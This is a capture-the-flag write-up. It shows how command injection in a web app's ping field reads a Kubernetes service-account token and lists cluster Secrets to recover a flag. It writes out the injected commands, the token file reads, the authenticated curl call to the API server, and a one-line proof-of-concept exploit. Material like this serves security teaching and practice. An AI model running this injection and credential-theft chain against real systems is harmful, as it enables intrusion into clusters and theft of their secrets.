# Vulnerability

Excessive access for a service account attached to backend pod, so with extracted token from it, access to cluster can be established with connecting to API server directly. 

# Extraction

1. extracted the token of service account attached to pod using this command:
```
$ ping -c 2 google.com; cat /var/run/secrets/kubernetes.io/serviceaccount/token
<JWT_TOKEN>
```

The backend pod's service account has excessive RBAC permissions, including permission to list Secrets across the cluster. I can use it to authenticate directly to the Kubernetes API server and access Secrets. 

I alread have the IP of kubernetes API server :
```
$ ping -c 2 google.com; env
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.96.0.1:443
HOSTNAME=backend-5775d6b569-lcz2h
```

```
$ ping -c 2 google.com; curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://10.96.0.1/api/v1/secrets
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "168768"
  },
  "items": [
    {
      "metadata": {
        "name": "flag-secret",
        "namespace": "ctf-secrets",
        "uid": "e047e5ac-70b0-46b4-a3ec-01dce5845e06",
        "resourceVersion": "7993",
        "creationTimestamp": "2026-08-19T15:27:26Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"<BASE64_FLAG>=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"flag-secret\",\"namespace\":\"ctf-secrets\"},\"type\":\"Opaque\"}\n"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2026-08-19T15:27:26Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:flag": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "flag": "FLAG-BASE64"
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "ctf-tls",
        "namespace": "saas-app",
        "uid": "db732836-6b68-4b43-893c-d4e9033a13f2",
        "resourceVersion": "43916",
        "creationTimestamp": "2026-08-19T22:04:37Z",
        "managedFields": [
          {
            "manager": "kubectl-create",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2026-08-19T22:04:37Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:tls.crt": {},
                "f:tls.key": {}
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "tls.crt": ...
      },
      "type": "kubernetes.io/tls"
    },
    {
      "metadata": {
        "name": "sh.helm.release.v1.traefik.v1",
        "namespace": "traefik",
        "uid": "acbb125b-cf16-4f38-83ef-768f25c45b84",
        "resourceVersion": "1139",
        "creationTimestamp": "2026-08-19T14:15:32Z",
        "labels": {
          "modifiedAt": "1787148932",
          "name": "traefik",
          "owner": "helm",
          "status": "deployed",
          "version": "1"
        },
        "managedFields": [
          {
            "manager": "Helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2026-08-19T14:15:32Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:release": {}
              },
              "f:metadata": {
                "f:labels": {
                  ".": {},
                  "f:modifiedAt": {},
                  "f:name": {},
                  "f:owner": {},
                  "f:status": {},
                  "f:version": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "release": ...
```

flag is found :
```
"data": {
    "flag": "FLAG-BASE64"
},
```
`data.flag` value is Base64-encoded and is decoded to obtain the flag.

# PoC

```
curl -s -X POST 'https://ctf.seoeh.ir/api/diag/ping' -H 'Content-Type: application/json' -d '{
    "host": "google.com; curl -sk -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://10.96.0.1/api/v1/secrets"
  }' | grep -oP '\\"flag\\"\s*:\s*\\"\K[A-Za-z0-9+/=]+' | base64 -d
```